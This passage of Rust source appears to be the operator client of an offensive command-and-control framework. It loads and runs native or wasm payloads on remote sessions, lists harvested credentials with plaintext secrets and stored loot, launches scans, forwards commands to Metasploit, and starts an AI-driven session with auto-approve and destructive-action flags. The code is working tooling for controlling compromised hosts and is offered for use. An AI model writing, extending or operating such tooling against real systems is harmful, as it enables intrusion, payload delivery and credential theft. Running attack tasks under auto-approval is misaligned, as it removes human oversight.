            for extension in extensions {
                println!(
                    "{}\t{}\t{}\t{}\t{}\t{}\t{}",
                    extension.id,
                    extension.name,
                    extension.version,
                    extension.kind,
                    extension.platform,
                    extension.size,
                    extension.installed_by
                );
            }
        }
        Command::ExtensionInstall { package } => {
            let bytes = tokio::fs::read(&package)
                .await
                .with_context(|| format!("failed to read {}", package.display()))?;
            let info = client.install_extension(bytes).await?;
            println!("installed {} {} ({})", info.name, info.version, info.id);
        }
        Command::ExtensionFetch { id, output } => {
            let response = client.fetch_extension(&id).await?;
            let info = response.info.context("registry returned no metadata")?;
            tokio::fs::write(&output, &response.payload)
                .await
                .with_context(|| format!("failed to write {}", output.display()))?;
            println!(
                "fetched {} {} ({} bytes) to {}",
                info.name,
                info.version,
                response.payload.len(),
                output.display()
            );
        }
        Command::ExtensionDelete { id } => {
            client.delete_extension(&id).await?;
            println!("deleted {id}");
        }
        Command::ExtensionPack {
            file,
            name,
            version,
            kind,
            platform,
            arch,
            description,
            key,
            output,
        } => {
            let payload = tokio::fs::read(&file)
                .await
                .with_context(|| format!("failed to read {}", file.display()))?;
            let seed_hex = read_text_file(&key)?;
            let seed_bytes = hex_decode(&seed_hex)?;
            let seed: [u8; 32] = seed_bytes
                .as_slice()
                .try_into()
                .context("armory key must be a 32-byte hex seed")?;
            let identity = shikra_crypto::signing::Identity::from_seed(&seed);
            let kind = shikra_transport::extension::ExtensionKind::parse(&kind)
                .context("kind must be wasm or native")?;
            let platform = shikra_transport::extension::ExtensionPlatform::parse(&platform)
                .context("platform must be any, macos, linux or windows")?;
            let manifest = shikra_transport::extension::ExtensionManifest {
                name: name.clone(),
                version: version.clone(),
                kind,
                platform,
                architecture: arch,
                description,
                sha256: String::new(),
                size: 0,
            };
            let package =
                shikra_transport::extension::ExtensionPackage::build(manifest, &payload, &identity)
                    .context("failed to build extension package")?;
            let json = package.to_json().context("failed to encode package")?;
            tokio::fs::write(&output, &json)
                .await
                .with_context(|| format!("failed to write {}", output.display()))?;
            println!(
                "packed {name} {version} ({} bytes) -> {}",
                payload.len(),
                output.display()
            );
        }
        Command::ExtensionPush {
            session,
            name,
            platform,
        } => {
            let response = client.fetch_extension_by_name(&name, &platform).await?;
            let info = response.info.context("registry returned no metadata")?;
            let task = match info.kind.as_str() {
                "wasm" => "wasm_load",
                _ => "native_load",
            };
            let result = client
                .submit_task(
                    &session,
                    task,
                    serde_json::json!({ "name": name }),
                    response.payload,
                )
                .await?;
            for result in result {
                print_result(&result);
                if result.exit_code != 0 {
                    std::process::exit(result.exit_code);
                }
            }
        }
        Command::NativeLoad {
            session,
            name,
            file,
        } => {
            let payload = read_binary(&file).await?;
            let result = client
                .run_task(
                    &session,
                    "native_load",
                    serde_json::json!({ "name": name, "payload": payload }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::NativeRun {
            session,
            name,
            args,
        } => {
            let result = client
                .run_task(
                    &session,
                    "native_run",
                    serde_json::json!({ "name": name, "args": args }),
                )
                .await?;
            print_result(&result);
            if result.exit_code != 0 {
                std::process::exit(result.exit_code);
            }
        }
        Command::NativeList { session } => {
            let result = client
                .run_task(&session, "native_list", serde_json::Value::Null)
                .await?;
            print_result(&result);
        }
        Command::NativeRemove { session, name } => {
            let result = client
                .run_task(
                    &session,
                    "native_remove",
                    serde_json::json!({ "name": name }),
                )
                .await?;
            print_result(&result);
        }
        Command::Ai {
            prompt,
            auto_approve,
            allow_destructive,
            max_iterations,
        } => {
            shikra_client::ai::run_ai_session(
                &client,
                prompt,
                auto_approve,
                allow_destructive,
                max_iterations,
            )
            .await?;
        }
        Command::Operators => {
            let operators = client.list_operators().await?;
            if operators.is_empty() {
                println!("no operators");
            }
            for operator in operators {
                println!(
                    "{}\t{}\t{}\t{}",
                    operator.id, operator.name, operator.role, operator.disabled
                );
            }
        }
        Command::OperatorAdd { name, role } => {
            let response = client.create_operator(&name, &role).await?;
            if let Some(operator) = response.operator {
                println!("created {} ({})", operator.name, operator.role);
            }
            println!("token: {}", response.token);
            println!("(store this token now; it is not shown again)");
        }
        Command::OperatorDel { id } => {
            client.delete_operator(&id).await?;
            println!("deleted operator {id}");
        }
        Command::Creds { command } => match command {
            CredsCommand::List => {
                let credentials = client.list_credentials().await?;
                if credentials.is_empty() {
                    println!("no credentials");
                }
                for credential in credentials {
                    println!(
                        "{}\t{}\t{}\t{}\t{}",
                        credential.id,
                        credential.host,
                        credential.username,
                        credential.kind,
                        credential.secret
                    );
                }
            }
            CredsCommand::Add {
                host,
                username,
                secret,
                kind,
            } => {
                let credential = client
                    .add_credential(&host, &username, &secret, &kind)
                    .await?;
                println!(
                    "stored credential {} for {}",
                    credential.id, credential.username
                );
            }
        },
        Command::Loot { command } => match command {
            LootCommand::List => {
                let loot = client.list_loot().await?;
                if loot.is_empty() {
                    println!("no loot");
                }
                for item in loot {
                    println!(
                        "{}\t{}\t{}\t{}\t{}",
                        item.id, item.kind, item.name, item.size, item.sha256
                    );
                }
            }
            LootCommand::Add { name, file, kind } => {
                let data = tokio::fs::read(&file)
                    .await
                    .with_context(|| format!("failed to read {}", file.display()))?;
                let item = client.add_loot(&name, data, &kind).await?;
                println!(
                    "stored loot {} ({} bytes, sha256 {})",
                    item.id, item.size, item.sha256
                );
            }
        },
        Command::Canary { command } => match command {
            CanaryCommand::List => {
                let canaries = client.list_canaries().await?;
                if canaries.is_empty() {
                    println!("no canaries");
                }
                for canary in canaries {
                    println!(
                        "{}\t{}\t{}\ttriggered={}",
                        canary.id, canary.kind, canary.token, canary.triggered
                    );
                }
            }
            CanaryCommand::Create { kind, note } => {
                let canary = client.create_canary(&kind, &note).await?;
                println!("canary {} created", canary.id);
                println!("token: {}", canary.token);
            }
        },
        Command::Audit => {
            let status = client.verify_audit().await?;
            println!(
                "valid={} entries={} {}",
                status.valid, status.entries, status.message
            );
            if !status.valid {
                std::process::exit(1);
            }
        }
        Command::Reactions => {
            let reactions = client.list_reactions().await?;
            if reactions.is_empty() {
                println!("no reaction rules");
            }
            for reaction in reactions {
                println!(
                    "{}\t{}\t{}\tenabled={}",
                    reaction.id, reaction.event_kind, reaction.action, reaction.enabled
                );
            }
        }
        Command::ReactionAdd { event, action } => {
            let reaction = client.add_reaction(&event, &action).await?;
            println!(
                "reaction {} added: {} -> {}",
                reaction.id, reaction.event_kind, reaction.action
            );
        }
        Command::Report { output } => {
            shikra_client::save_report(&mut client, output.as_deref()).await?;
        }
        Command::Scan {
            target,
            ports,
            arguments,
        } => {
            let result = client.run_scan(&target, &ports, &arguments).await?;
            println!("{} ({} host(s))", result.message, result.hosts_found);
        }
        Command::Hosts => {
            let hosts = client.list_hosts().await?;
            if hosts.is_empty() {
                println!("no hosts discovered");
            }
            for host in hosts {
                println!(
                    "{}\t{}\t{}\t{}\t{}",
                    host.ip, host.hostname, host.os, host.source, host.ports
                );
            }
        }
        Command::MsfStatus => {
            let status = client.msf_status().await?;
            println!(
                "connected={} version={} {}",
                status.connected, status.version, status.message
            );
        }
        Command::MsfExec { command } => {
            let line = command.join(" ");
            if line.is_empty() {
                anyhow::bail!("msf-exec requires a command");
            }
            let result = client.msf_exec(&line).await?;
            print!("{}", result.output);
        }
    }

    Ok(())
}

fn parse_host_port(value: &str) -> Result<(String, u16)> {
    let (host, port) = value
        .rsplit_once(':')
        .with_context(|| format!("invalid host:port {value:?}"))?;
    let port: u16 = port
        .parse()
        .with_context(|| format!("invalid port in {value:?}"))?;
    Ok((host.to_string(), port))
}

async fn read_binary(path: &Path) -> Result<String> {
    use base64::Engine;
    let bytes = tokio::fs::read(path)
        .await
        .with_context(|| format!("failed to read {}", path.display()))?;
    Ok(base64::engine::general_purpose::STANDARD.encode(bytes))
}

fn print_result(result: &shikra_proto::v1::TaskResult) {
    let stdout = String::from_utf8_lossy(&result.output);
    if !stdout.is_empty() {
        println!("{stdout}");
    }
    if result.exit_code != 0 {
        eprintln!("[exit code {}]", result.exit_code);
    }
}

fn print_ls(result: &shikra_proto::v1::TaskResult) -> Result<()> {
    if result.exit_code != 0 {
        print_result(result);
        return Ok(());
    }
    let entries: Vec<serde_json::Value> =
        serde_json::from_slice(&result.output).context("invalid ls response")?;
    for entry in entries {
        let kind = if entry["is_dir"].as_bool().unwrap_or(false) {
            "dir "
        } else {
            "file"
        };
        println!(
            "{kind}\t{:>10}\t{}",
            entry["size"].as_u64().unwrap_or(0),
            entry["name"].as_str().unwrap_or_default()
        );
    }
    Ok(())
}

fn platform_name(platform: i32) -> &'static str {
    use shikra_proto::v1::Platform;
    match Platform::try_from(platform) {
        Ok(Platform::Windows) => "windows",
        Ok(Platform::Linux) => "linux",
        Ok(Platform::Macos) => "macos",
        _ => "unknown",
    }
}
